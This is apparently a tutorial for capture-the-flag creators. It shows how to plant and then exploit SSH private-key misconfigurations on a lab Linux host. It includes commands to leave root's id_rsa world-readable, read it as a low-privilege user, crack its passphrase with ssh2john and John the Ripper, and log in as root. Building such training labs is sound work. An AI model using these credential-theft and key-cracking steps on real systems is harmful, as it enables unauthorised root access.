# Linux Privilege Escalation - SSH for CTF Creators


# SSH

SSH allows us to establish an encrypted remote or local connection to a terminal. Depending on how the SSH service is configured we may be able to log in as another user or even the root user by one of these methods:

-   Private Keys
-   Agent Forwarding
-   Credentials

There are a numbers of ways that SSH can be used to elevate privileges on a system. Ranging from SSH keys to SSH agents.

#  Privilege Escalation via SSH Private Keys

First, let's make sure that we can log in as root by reading the SSH configuration file:

```shell
user@pwn:~$ grep PermitRootLogin /etc/ssh/sshd_config
#PermitRootLogin prohibit-password
# the setting of "PermitRootLogin without-password".
```

Generate the keys without a passphrase:

```bash
root@pwn:~# ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Created directory '/root/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:xxxxxxxxxxxxxxxxxxxxxxxxx root@pwn
The key's randomart image is:
<SNIP>

```

Verify if these keys were created:

```bash
root@pwn:~# ls -l /root/.ssh
total 8
-rw------- 1 root root 2602 Dec 20 20:45 id_rsa
-rw-r--r-- 1 root root  565 Dec 20 20:45 id_rsa.pub
```

Add the public key to the `authorized_keys` file:

```bash
cat /root/.ssh/id_rsa.pub > /root/.ssh/authorized_keys
```

A common misconfiguration that may see in CTF machines is where the private key is stored in insecure locations, in directories in which we have read permissions:

```bash
/tmp
/var/tmp
/var/backups
/var/www/html
/opt
/.ssh
/.custom_hidden_directory
```

Let's create a backup of the private key (normally we wouldn't do this in a real machine):

```bash
root@pwn:~# cp /root/.ssh/id_rsa /var/backups && chmod 755 -R /var/backups
```

Switch to the user-privileged user, to simulate the adversary scenario:

```bash
user@pwn:~$ ls -la /var/backups/id_rsa 
-rwxr-xr-x 1 root root 2602 Dec 20 20:45 /var/backups/id_rsa
user@pwn:~$ cat /var/backups/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
-----END OPENSSH PRIVATE KEY-----

```

As the adversary, we would either copy this text and create a file in our adversary host or transfer this file to our adversary host.

In our adversary host we must add the correct permissions to the private key:

```bash
chmod 600 id_rsa
```

Finally, log in as the owner of the private key and connect to the target host:

```bash
ssh -i id_rsa root@10.10.10.14
```

The output will look something like this:

```bash
❯ ssh -i id_rsa root@10.10.10.14
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-43-generic x86_64)

<...SNIP...>

root@pwn:~# whoami
root
root@pwn:~# hostname
ubuntu
```

#  Privilege Escalation via SSH Encrypted Private Keys

First, let's make sure that we can log in as root by reading the SSH configuration file:

```shell
user@pwn:~$ grep PermitRootLogin /etc/ssh/sshd_config
#PermitRootLogin prohibit-password
# the setting of "PermitRootLogin without-password".
```

Generate the keys, overwrite the existing keys and add a passphrase, I will use (`passme`) as the passphrase:

```bash
root@pwn:~# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
/root/.ssh/id_rsa already exists.
Overwrite (y/n)? y 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:xxxxxxxxxxxxxxxxxxxxxxxx root@pwn
The key's randomart image is:
<SNIP>

```

Verify if these keys were created:

```bash
root@pwn:~# ls -l /root/.ssh
total 12
-rw-r--r-- 1 root root  565 Dec 28 17:22 authorized_keys
-rw------- 1 root root 2635 Dec 28 17:30 id_rsa
-rw-r--r-- 1 root root  565 Dec 28 17:30 id_rsa.pub
```

Add the public key to the authorized_keys file:

```bash
cat /root/.ssh/id_rsa.pub > /root/.ssh/authorized_keys
```

A common misconfiguration that may see in CTF machines is where the private key is stored in insecure locations, in directories in which we have read permissions:

```bash
/tmp
/var/tmp
/var/backups
/var/www/html
/opt
/.ssh
/.custom_hidden_directory
```

Let's create a backup of the private key (normally we wouldn't do this in a real machine):

```bash
root@pwn:~# cp /root/.ssh/id_rsa /var/backups && chmod 755 -R /var/backups
```

Switch to the user-privileged user, to simulate the adversary scenario:

```bash
user@pwn:~$ cat /var/backups/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
<SNIP>
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-----END OPENSSH PRIVATE KEY-----

```

Once we find the private key we can read the file and add it to our adversary host.

Now we need to crack this key, to do that we must convert the SSH key into a format that John understands, for that we can use ssh2john.

Find where ssh2john is located, otherwise, download it.

```shell
❯ find / -name 'ssh2john.py' 2>/dev/null
/usr/share/john/ssh2john.py
```

Convert the private key to `John` crackable format:

```bash
/usr/share/john/ssh2john.py id_rsa > id_rsa.john
```

Attempt to crack the hash with JohnTheRipper, this may take a while:

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
passme           (id_rsa)
1g 0:00:04:52 DONE (2021-12-28 16:41) 0.003415g/s 63.16p/s 63.16c/s 63.16C/s sweetgurl..maria13
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now we know the passphrase of the private key which is (`passme`) so we can attempt to log in.

In our adversary host we must add the correct permissions to the private key:

```bash
chmod 600 id_rsa
```

Finally, log in as the owner of the private key:

```bash
❯ ssh -i id_rsa root@10.10.10.14
Enter passphrase for key 'id_rsa': # <- passphrase here
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-43-generic x86_64)

<...SNIP...> 

root@pwn:~# whoami
root
root@pwn:~#
```


